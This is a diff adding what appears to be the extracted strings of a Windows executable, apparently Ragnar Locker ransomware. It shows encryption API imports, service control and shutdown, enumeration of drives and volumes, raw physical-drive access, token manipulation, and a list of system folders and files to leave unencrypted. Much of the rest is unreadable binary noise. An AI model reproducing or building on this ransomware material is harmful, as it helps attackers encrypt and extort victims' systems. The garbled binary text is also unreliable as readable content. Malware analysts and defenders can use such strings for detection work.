@@ -1,0 +1,189 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+@.reloc
+NAR_RPW
+K<^_[]
+PPPPPh
+W?_^[]
+@(l>+
+SD;SDw
+Wow64EnableWow64FsRedirection
+***********************************************************************************
+---RAGNAR SECRET---
+D7q/;M
+.text$mn
+.idata$5
+.rdata
+.rdata$zzzdbg
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.rsrc$01
+.rsrc$02
+GetProcAddress
+LocalFree
+VirtualAlloc
+VirtualFree
+HeapAlloc
+HeapFree
+GetProcessHeap
+GetCurrentProcess
+ExitProcess
+TerminateProcess
+GetLastError
+WaitForSingleObject
+GetLogicalDrives
+LockFile
+UnlockFile
+GetFileSizeEx
+WriteFile
+ReadFile
+DeviceIoControl
+SetFilePointerEx
+FindClose
+CloseHandle
+GetNativeSystemInfo
+GetTickCount
+lstrcmpiW
+lstrcpyA
+lstrcpyW
+lstrcatW
+lstrlenA
+lstrlenW
+CreateEventW
+LoadLibraryW
+CreateProcessW
+GetStartupInfoW
+GetDriveTypeW
+GetSystemDirectoryW
+GetWindowsDirectoryW
+GetFullPathNameW
+CreateFileW
+SetFileAttributesW
+GetFileAttributesW
+FindFirstFileW
+FindNextFileW
+CopyFileW
+MoveFileExW
+GetVolumeInformationA
+GetVolumeInformationW
+GetComputerNameW
+FindFirstVolumeA
+FindNextVolumeA
+FindVolumeClose
+SetVolumeMountPointA
+GetVolumePathNamesForVolumeNameA
+WTSGetActiveConsoleSessionId
+MultiByteToWideChar
+GetLocaleInfoW
+KERNEL32.dll
+wsprintfA
+wsprintfW
+USER32.dll
+OpenProcessToken
+SetTokenInformation
+GetUserNameW
+CreateProcessAsUserW
+DuplicateTokenEx
+RegCloseKey
+RegOpenKeyExW
+RegQueryValueExW
+CryptAcquireContextW
+CryptDestroyKey
+CryptEncrypt
+CloseServiceHandle
+ControlService
+EnumDependentServicesA
+EnumServicesStatusA
+OpenSCManagerA
+OpenServiceA
+QueryServiceStatusEx
+CryptReleaseContext
+CryptGenRandom
+ADVAPI32.dll
+SHGetSpecialFolderPathW
+SHELL32.dll
+StrStrIA
+StrToIntA
+PathFindExtensionW
+SHLWAPI.dll
+CryptDecodeObjectEx
+CryptImportPublicKeyInfo
+CryptStringToBinaryW
+CryptBinaryToStringA
+CRYPT32.dll
+r=<X}EvQjyh46nZ%VyFt<v\%Wt+nU Y0}99Gk+_ha.K`UErpj5-OyMcnja/y+$d}
++hCx')f
+|]%[m(
+"2$S,XMp5D
+l*aH{tS
+'~0s`0
+rvd&g,
+>N?;U!
+z9=N5N
+KXw=;bK
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+0!0'0,030G0M0k1{1
+2!2/2=2g2
+3>3K3T3
+4!4'464|4
+4"5.686?6V6
+8B8S8f8l8}8
+;&;,;7;N;S;j;p;
+<%<4<;<B<I<P<W<^<e<l<s<z<
+!0<0E0`0g0
+1)121N2i2
+::):.:G:W:k:
+;;8;?;^;
+=*=0=6===W=]=
+=*>h>s>z>
+?&?7?I?
+0"0D0S0Z0
+1/14191>1H1N1T1
+2-222?2
+3"3'32393j3w3
+SOFTWARE\Microsoft\Cryptography
+MachineGuid
+ProductName
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+%s-%s-%s-%s-%s
+kernel32.dll
+Windows
+Windows.old
+Tor browser
+Internet Explorer
+Google
+Opera Software
+Mozilla
+Mozilla Firefox
+$Recycle.Bin
+ProgramData
+All Users
+autorun.inf
+boot.ini
+bootfont.bin
+bootsect.bak
+bootmgr
+bootmgr.efi
+bootmgfw.efi
+desktop.ini
+iconcache.db
+ntuser.dat
+ntuser.dat.log
+ntuser.ini
+thumbs.db
+\\.\PHYSICALDRIVE%d
+.ragnar_
+WinSta0\Default
+\notepad.exe
